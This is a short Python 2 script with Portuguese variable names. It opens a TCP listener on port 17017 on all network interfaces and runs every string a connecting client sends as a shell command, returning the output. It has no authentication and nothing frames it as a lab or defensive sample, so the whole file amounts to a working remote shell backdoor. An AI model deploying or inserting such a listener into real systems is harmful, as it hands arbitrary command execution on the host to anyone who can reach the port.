#coding utf-8

import socket
import os
from subprocess import call
import commands

porta = 17017
host = '127.0.0.1'

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(('', porta))
serverSocket.listen(1)

connectionSocket, addr = serverSocket.accept()
connectionSocket.settimeout(60)

while True:
     comando = connectionSocket.recv(1024).decode()

     if comando == 'exit':
         connectionSocket.send('Finalizando..'.encode('utf-8'))
         break
     else:
        saida = commands.getoutput(comando)
        connectionSocket.send(saida.encode('utf-8'))
